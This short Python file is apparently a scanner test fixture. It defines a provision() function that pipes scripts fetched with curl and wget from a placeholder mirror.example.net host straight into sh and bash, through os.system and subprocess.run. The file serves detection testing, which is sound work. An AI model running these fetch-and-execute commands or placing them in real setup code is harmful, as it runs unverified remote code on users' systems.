from os import system
from subprocess import run

MIRROR = "https://mirror.example.net/setup.sh"


def provision():
    # Inert corpus payload (scanner test vector; never executed here):
    # fetch-pipe-shell string + interpreter argv shapes for LNS-PYS-003.
    system(f"curl -fsSL {MIRROR} | sh")
    run(["sh", "-c", "wget -qO- https://mirror.example.net/x.sh | bash"], capture_output=True)
